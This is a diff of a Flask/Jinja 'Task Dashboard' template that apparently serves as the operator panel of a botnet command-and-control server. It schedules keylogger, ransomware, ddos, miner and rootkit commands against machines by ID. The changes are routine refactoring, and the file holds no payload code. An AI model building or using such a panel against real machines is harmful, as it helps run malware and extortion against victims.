@@ -12,48 +12,32 @@
     <!-- ───────── header bar ───────── -->
     <div class="head-bar">
       <h1 id="head-bar-header">Task Dashboard</h1>
-
       <div class="head-bar-buttons" style="text-align:right;">
-        <!-- Back to the main machine list -->
-        <button
-          type="button"
-          id="home-button"
-          onclick="window.location.href='{{ url_for('index') }}';">
+        <button type="button" id="home-button"
+                onclick="window.location.href='{{ url_for('index') }}';">
           Back
         </button>
-
-        <!-- Jump to the admin dashboard -->
-        <button
-          type="button"
-          id="admin-button"
-          onclick="window.location.href='/admin';">
+        <button type="button" id="admin-button"
+                onclick="window.location.href='{{ url_for('admin_dashboard') }}';">
           Admin
         </button>
-
-        <!-- Proper POST sign‑out -->
         <form action="{{ url_for('logout') }}" method="POST" style="display:inline;">
-          <button type="submit" id="sign-out-button">Sign&nbsp;Out</button>
+          <button type="submit" id="sign-out-button">Sign Out</button>
         </form>
       </div>
     </div>
 
-    <!-- ───────── Add New Task form ───────── -->
+    <!-- ───────── Add New Task ───────── -->
     <h2>Add New Task</h2>
-    <form action="/tasks/add_task" method="POST" id="task-form">
+    <form action="{{ url_for('add_new_task') }}" method="POST" id="task-form">
       <div class="task-option">
-        <h3 class="task-input-head">Machine&nbsp;ID:</h3>
-        <input
-          type="number"
-          class="task-input"
-          name="machine_id"
-          id="machine-id"
-          placeholder="Input machine ID"
-          required />
+        <h3 class="task-input-head">Machine ID:</h3>
+        <input type="number" class="task-input"
+               name="machine_id" placeholder="Machine ID" required />
       </div>
-
       <div class="task-option">
         <h3 class="task-input-head">Command:</h3>
-        <select class="task-input" name="command" id="cmd" required>
+        <select class="task-input" name="command" required>
           <option value="keylogger">keylogger</option>
           <option value="ransomware">ransomware</option>
           <option value="ddos">ddos</option>
@@ -61,18 +45,11 @@
           <option value="rootkit">rootkit</option>
         </select>
       </div>
-
       <div class="task-option">
-        <!-- Updated label and input name to 'last_checkin' -->
-        <h3 class="task-input-head">Last&nbsp;CheckIn:</h3>
-        <input
-          type="datetime-local"
-          class="task-input"
-          name="last_checkin"
-          id="tsk-time"
-          required />
+        <h3 class="task-input-head">Scheduled At:</h3>
+        <input type="datetime-local" class="task-input"
+               name="scheduled_at" id="tsk-time" required />
       </div>
-
       <button type="submit" id="task-button">Submit</button>
     </form>
 
@@ -81,9 +58,9 @@
     <table>
       <thead>
         <tr>
-          <th>Machine ID</th>
+          <th>Machine ID</th>
           <th>Command</th>
-          <th>Last CheckIn</th>
+          <th>Scheduled At</th>
           <th colspan="2">Actions</th>
         </tr>
       </thead>
@@ -92,33 +69,24 @@
         <tr>
           <form action="{{ url_for('update_task', task_id=task.id) }}" method="POST">
             <td>
-              <input 
-                type="number" 
-                name="machine_id" 
-                value="{{ task.machine_id }}" 
-                required 
-              />
+              <input type="number" name="machine_id"
+                     value="{{ task.machine_id }}" required />
             </td>
             <td>
               <select name="command" required>
-                <option value="keylogger"   {{ 'selected' if task.command == 'keylogger'   else '' }}>keylogger</option>
-                <option value="ransomware"  {{ 'selected' if task.command == 'ransomware'  else '' }}>ransomware</option>
-                <option value="ddos"        {{ 'selected' if task.command == 'ddos'        else '' }}>ddos</option>
-                <option value="miner"       {{ 'selected' if task.command == 'miner'       else '' }}>miner</option>
-                <option value="rootkit"     {{ 'selected' if task.command == 'rootkit'     else '' }}>rootkit</option>
+                <option value="keylogger"   {{ 'selected' if task.command=='keylogger'   else '' }}>keylogger</option>
+                <option value="ransomware"  {{ 'selected' if task.command=='ransomware'  else '' }}>ransomware</option>
+                <option value="ddos"        {{ 'selected' if task.command=='ddos'        else '' }}>ddos</option>
+                <option value="miner"       {{ 'selected' if task.command=='miner'       else '' }}>miner</option>
+                <option value="rootkit"     {{ 'selected' if task.command=='rootkit'     else '' }}>rootkit</option>
               </select>
             </td>
             <td>
-              <input
-                type="datetime-local"
-                name="last_checkin"
-                value="{% if task.last_checkin %}{{ task.last_checkin|strftime('%Y-%m-%dT%H:%M') }}{% endif %}"
-                required
-              />
+              <input type="datetime-local" name="scheduled_at"
+                     value="{% if task.scheduled_at %}{{ task.scheduled_at|strftime('%Y-%m-%dT%H:%M') }}{% endif %}"
+                     required />
             </td>
-            <td>
-              <button type="submit">Update</button>
-            </td>
+            <td><button type="submit">Update</button></td>
           </form>
           <td>
             <form action="{{ url_for('delete_task', task_id=task.id) }}" method="POST">
@@ -134,9 +102,8 @@
   <!-- JS: set min date‑time to “now” for the Add Task form -->
   <script>
     document.addEventListener("DOMContentLoaded", () => {
-      const now = new Date();
-      const minValue = now.toISOString().slice(0, 16); // YYYY‑MM‑DDTHH:MM
-      document.getElementById("tsk-time").setAttribute("min", minValue);
+      const now = new Date().toISOString().slice(0,16);
+      document.getElementById("tsk-time").min = now;
     });
   </script>
 </body>
